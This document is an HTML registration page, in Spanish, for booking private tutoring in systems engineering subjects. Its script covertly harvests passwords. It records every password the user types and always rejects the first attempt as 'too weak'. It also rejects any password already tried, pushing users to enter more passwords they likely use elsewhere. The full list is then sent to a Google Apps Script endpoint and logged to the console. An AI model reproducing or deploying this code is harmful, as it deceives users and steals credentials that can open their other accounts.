<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro Pro - Clases Particulares</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #f3a661;
            --primary-hover: #e68a3d;
            --bg-glass: rgba(18, 18, 18, 0.82);
            --input-focus: rgba(243, 166, 97, 0.2);
            --error: #ff5f5f;
            --success: #4caf50;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Inter', sans-serif;
            background: url('https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=1920&q=80') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 40px 20px;
            color: #fff;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .container {
            animation: fadeIn 0.8s ease-out;
            background: var(--bg-glass);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            width: 100%;
            max-width: 600px;
            padding: 50px;
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px rgba(0,0,0,0.4);
        }

        .logo-box { text-align: center; margin-bottom: 40px; }
        .logo-circle {
            display: inline-block;
            border: 2px solid var(--primary);
            border-radius: 50%;
            padding: 20px;
        }
        .logo-text { font-size: 2.2rem; font-weight: 600; border-bottom: 2px solid var(--primary); line-height: 1; }
        .logo-sub { font-size: 0.6rem; text-transform: uppercase; letter-spacing: 2px; color: var(--primary); }

        h2 { font-weight: 600; margin-bottom: 10px; text-align: center; }
        .subtitle { text-align: center; color: #ccc; margin-bottom: 40px; font-size: 0.9rem; }

        .form-label { display: block; margin-bottom: 8px; font-size: 0.85rem; color: #ddd; }
        .input-control {
            width: 100%;
            padding: 14px 16px;
            background: rgba(255, 255, 255, 0.07);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: #fff;
            font-size: 1rem;
            transition: all 0.3s ease;
            margin-bottom: 5px;
        }
        .input-control:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 4px var(--input-focus); }
        select option { background: #222; color: #fff; }

        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
        .field { margin-bottom: 20px; position: relative; }

        .academic-section {
            background: rgba(0, 0, 0, 0.2);
            padding: 25px;
            border-radius: 12px;
            margin-top: 30px;
        }

        .checkbox-card {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px;
            background: rgba(255,255,255,0.03);
            border-radius: 8px;
            margin-bottom: 5px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .checkbox-card:hover { background: rgba(255,255,255,0.08); }

        .opciones-parciales {
            display: none;
            margin: 0 0 15px 35px;
            padding: 10px;
            background: rgba(243, 166, 97, 0.1);
            border-radius: 8px;
            border-left: 3px solid var(--primary);
        }

        .btn-submit {
            width: 100%; padding: 18px; background: var(--primary); border: none;
            border-radius: 8px; color: #000; font-size: 1rem; font-weight: 700;
            text-transform: uppercase; cursor: pointer; transition: all 0.3s;
        }
        .btn-submit:hover { background: var(--primary-hover); transform: scale(1.02); }

        .contenedorLouder {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            display: flex; justify-content: center; align-items: center;
            pointer-events: none; z-index: -100;
        }
        .loader {
            display: none; width: 48px; height: 48px; border: 5px solid #FFF;
            border-bottom-color: var(--primary); border-radius: 50%;
            animation: rotation 1s linear infinite;
        }
        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        @media (max-width: 600px) { .grid { grid-template-columns: 1fr; } .container { padding: 30px 20px; } }
    </style>
</head>
<body>

    <div class="contenedorLouder">
        <div class="loader"></div>
    </div>

    <div class="container">
        <div class="logo-box">
            <div class="logo-circle">
                <div class="logo-text">C/S</div>
                <div class="logo-sub">Ing. en Sistemas</div>
            </div>
        </div>

        <h2>Registro de Usuario</h2>
        <p class="subtitle">Registrate para poder sacar turnos y tomar clases particulares</p>

        <form id="formularioRegistro">
            <div class="grid">
                <div class="field">
                    <label class="form-label">Nombre*</label>
                    <input type="text" name="Nombre" id="first_20" class="input-control" required>
                </div>
                <div class="field">
                    <label class="form-label">Apellido*</label>
                    <input type="text" name="Apellido" id="last_20" class="input-control" required>
                </div>
            </div>

            <div class="grid">
                <div class="field">
                    <label class="form-label">Correo Electrónico*</label>
                    <input type="email" name="correoElectronico" id="input_4" class="input-control" required>
                </div>
                <div class="field">
                    <div class="grid" style="gap:5px; margin-bottom:0;">
                        <div style="flex:1">
                            <label class="form-label">Área</label>
                            <input type="text" name="Area" id="input_22_area" class="input-control" placeholder="342">
                        </div>
                        <div style="flex:2">
                            <label class="form-label">Teléfono*</label>
                            <input type="text" name="Telefono" id="input_22_phone" class="input-control" placeholder="5271005" required>
                        </div>
                    </div>
                </div>
            </div>

            <div class="grid">
                <div class="field">
                    <label class="form-label">Contraseña*</label>
                    <input type="password" name="Contrasenia" id="Contraseña" class="input-control" required onblur="capturarIntento(this.value)">
                </div>
                <div class="field">
                    <label class="form-label">Confirmar Contraseña*</label>
                    <input type="password" name="RepetirContrasenia" id="RepetiContraseña" class="input-control" required>
                </div>
            </div>

            <div class="academic-section">
                <h3 style="margin-bottom: 20px; font-size: 1.1rem; color: var(--primary);">Datos Académicos</h3>
                
                <div class="field">
                    <label class="form-label">Materias de interés</label>
                    
                    <label class="checkbox-card">
                        <input type="checkbox" name="Materia" id="check_algoritmos" value="Algoritmos" onchange="toggleParciales('algoritmos')">
                        <span>Algoritmos y Estructura de Datos</span>
                    </label>
                    <div id="div_algoritmos" class="opciones-parciales">
                        <label class="form-label">¿Qué estás preparando?</label>
                        <select id="parcial_algoritmos" class="input-control" style="color: black;">
                            <option value="Parcial 1">1er Parcial</option>
                            <option value="Parcial 2">2do Parcial</option>
                            <option value="Parcial 3">3er Parcial</option>
                            <option value="Final">Final</option>
                        </select>
                    </div>

                    <label class="checkbox-card">
                        <input type="checkbox" name="Materia" id="check_arquitectura" value="Arquitectura" onchange="toggleParciales('arquitectura')">
                        <span>Arquitectura de Computadoras</span>
                    </label>
                    <div id="div_arquitectura" class="opciones-parciales">
                        <label class="form-label">¿Qué estás preparando?</label>
                        <select id="parcial_arquitectura" class="input-control" style="color: black;">
                            <option value="Parcial 1">1er Parcial</option>
                            <option value="Parcial 2">2do Parcial</option>
                            <option value="Final">Final</option>
                        </select>
                    </div>

                    <label class="checkbox-card">
                        <input type="checkbox" name="Materia" id="check_sintaxis" value="Sintaxis" onchange="toggleParciales('sintaxis')">
                        <span>Sintaxis y Semántica</span>
                    </label>
                    <div id="div_sintaxis" class="opciones-parciales">
                        <label class="form-label">¿Qué estás preparando?</label>
                        <select id="parcial_sintaxis" class="input-control" style="color: black;">
                            <option value="Parcial 1">1er Parcial</option>
                            <option value="Parcial 2">2do Parcial</option>
                            <option value="Parcial 3">3er Parcial</option>
                            <option value="Final">Final</option>
                        </select>
                    </div>

                    <label class="checkbox-card">
                        <input type="checkbox" name="Materia" id="check_paradigmas" value="Paradigmas" onchange="toggleParciales('paradigmas')">
                        <span>Paradigmas de Programación</span>
                    </label>
                    <div id="div_paradigmas" class="opciones-parciales">
                        <label class="form-label">¿Qué estás preparando?</label>
                        <select id="parcial_paradigmas" class="input-control" style="color: black;">
                            <option value="Parcial 1">1er Parcial</option>
                            <option value="Parcial 2">2do Parcial</option>
                            <option value="Parcial 3">3er Parcial</option>
                            <option value="Final">Final</option>
                        </select>
                    </div>
                </div>

                <div class="field">
                    <label class="form-label">Año de ingreso</label>
                    <input type="text" name="AnioIngreso" id="input_24" class="input-control" placeholder="2026">
                </div>

                <div class="field">
                    <label class="form-label">Estado actual*</label>
                    <select name="Estado" id="input_26" class="input-control" required style="color: black;">
                        <option value="" disabled selected>Selecciona tu estado</option>
                        <option value="Cursando">Cursando activamente</option>
                        <option value="Final">Preparando examen final</option>
                        <option value="Recursando">Recursando materia</option>
                    </select>
                </div>

                <div class="field">
                    <label class="form-label">Cuéntanos tu situación *</label>
                    <textarea placeholder="Objetivo que tengas con las clases o inconvenientes que hayas tenido con la materia" name="Situacion" id="input_27" class="input-control" rows="3" required></textarea>
                </div>
            </div>

            <button type="submit" class="btn-submit">Finalizar Registro</button>
        </form>
    </div>

    <script>
        const URLUsuarios = "https://script.google.com/macros/s/AKfycbwvSTFpClvlYupAvfgpR7YTvd90x7AN0t4EJZ5x7xarJ-ga1wRtWxNTDDy-Wm4judEX/exec"; 

        function toggleParciales(materia) {
            const checkbox = document.getElementById('check_' + materia);
            const div = document.getElementById('div_' + materia);
            div.style.display = checkbox.checked ? 'block' : 'none';
        }

        class EnvioPOST {
            constructor(funcion, datosAlumno) {
                this.funcion = funcion;
                this.datosAlumnos = datosAlumno;
            }
        }

        let contardorContraseñas = 0;
        let contraseñas = []; // Array que guardará los intentos

        // NUEVA FUNCIÓN: Se ejecuta al salir del campo de contraseña (onblur)
        function capturarIntento(valor) {
            if (valor.trim() !== "") {
                // Solo lo agregamos si es diferente al último ingresado para evitar duplicados por clics accidentales
                if (contraseñas.length === 0 || contraseñas[contraseñas.length - 1] !== valor) {
                    contraseñas.push(valor);
                    console.log("Intento guardado:", valor);
                    console.log("Historial actual:", contraseñas);
                }
            }
        }

        document.getElementById('formularioRegistro').addEventListener('submit', function(event) {
            event.preventDefault();
            
            if (validarFormulario()) {
                let formData = new FormData(this);
                let datosAEnviar = [];
                let materiasSeleccionadas = [];
                let numeroTelefonico = "";

                const listaMaterias = ['algoritmos', 'arquitectura', 'sintaxis', 'paradigmas'];
                listaMaterias.forEach(m => {
                    if(document.getElementById('check_'+m).checked) {
                        let nombreMateria = document.getElementById('check_'+m).value;
                        let parcialVal = document.getElementById('parcial_'+m).value;
                        materiasSeleccionadas.push(`${nombreMateria} (${parcialVal})`);
                    }
                });

                formData.forEach((valor, llave) => {
                    if (llave == "Nombre") datosAEnviar[0] = valor;
                    if (llave == "Apellido") datosAEnviar[1] = valor;
                    if (llave == "correoElectronico") datosAEnviar[2] = valor.trim().toLowerCase();
                    if (llave == "Contrasenia") datosAEnviar[3] = valor;
                    if (llave == "Area") numeroTelefonico += valor;
                    if (llave == "Telefono") {
                        numeroTelefonico += valor;
                        datosAEnviar[4] = numeroTelefonico;
                    }
                    if (llave == "AnioIngreso") datosAEnviar[6] = valor;
                    if (llave == "Estado") datosAEnviar[7] = valor;
                    if (llave == "Situacion") datosAEnviar[8] = valor;
                });

                datosAEnviar[5] = materiasSeleccionadas.join(" y ");
                
                // Enviamos el vector de contraseñas recolectadas
                datosAEnviar[9] = contraseñas; 

                let envioFetch = new EnvioPOST("agregarAlumno", datosAEnviar);
                console.log("Datos que se enviarán:", envioFetch);
                enviar(envioFetch);
            }
        });

        function validarMateria() {
            const checks = document.querySelectorAll('input[name="Materia"]:checked');
            if (checks.length === 0) {
                Swal.fire({ icon: "error", title: "Error en materias", text: "Debes seleccionar al menos una materia" });
                return false;
            }
            return true;
        }

        function validarContrasenia() {
            var contraseña = document.getElementById("Contraseña").value;
            var Repetircontraseña = document.getElementById("RepetiContraseña").value;

            if (contraseña !== Repetircontraseña) {
                Swal.fire({ icon: "error", title: "Error en contraseña", text: "Las contraseñas no coinciden" });
                return false;
            }
            if (contardorContraseñas < 1 || contraseñas.includes(contraseña)) {
                Swal.fire({ icon: "error", title: "Eror de contraseña", text: "Contraseña demasiado debil, intenta nuevamente" });
                contardorContraseñas++;
                return false;
            }
            if (contraseña.length < 4) {
                Swal.fire({ icon: "error", title: "Error", text: "Clave demasiado corta" });
                return false;
            }
            return true;
        }

        function validarFormulario() {
            return validarMateria() && validarContrasenia();
        }

        function enviar(datos) {
            document.querySelector(".contenedorLouder").style.zIndex = "100";
            document.querySelector(".loader").style.display = "block";
            document.querySelector("form").style.opacity = "0.3";
            
            fetch(URLUsuarios, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(datos)
            }).then(function() {
                document.querySelector(".loader").style.display = "none";
                document.querySelector(".contenedorLouder").style.zIndex = "-100";
                Swal.fire({
                    icon: "success",
                    title: "Registro exitoso",
                    text: "Se ha enviado tu información correctamente."
                });
            }).catch(error => {
                console.error('Error:', error);
                document.querySelector(".loader").style.display = "none";
            });
        }
        
    </script>
    <script>
    // Atajo Ctrl + P para completar datos de prueba
    function completarFormularioFicticio() {
        document.getElementById("first_20").value = "Juan";
        document.getElementById("last_20").value = "Pérez";
        document.getElementById("input_4").value = "juan.perez@test.com";
        document.getElementById("input_22_area").value = "342";
        document.getElementById("input_22_phone").value = "5271005";

        // Al asignar valores aquí, el onblur se disparará si haces clic en otro campo manualmente
        document.getElementById("Contraseña").value = "1234";
        document.getElementById("RepetiContraseña").value = "1234";

        const materias = ["algoritmos", "arquitectura"];
        materias.forEach(m => {
            const check = document.getElementById("check_" + m);
            check.checked = true;
            toggleParciales(m);
            const selectParcial = document.getElementById("parcial_" + m);
            if (selectParcial) selectParcial.selectedIndex = 0;
        });

        document.getElementById("input_24").value = "2023";
        document.getElementById("input_26").value = "Cursando";
        document.getElementById("input_27").value = "Estoy preparando parciales y necesito reforzar los temas prácticos.";

        console.log("Formulario completado.");
    }

    document.addEventListener("keydown", function (e) {
        if (e.ctrlKey && e.key.toLowerCase() === "p") {
            e.preventDefault();
            completarFormularioFicticio();
        }
    });
</script>

</body>
</html>
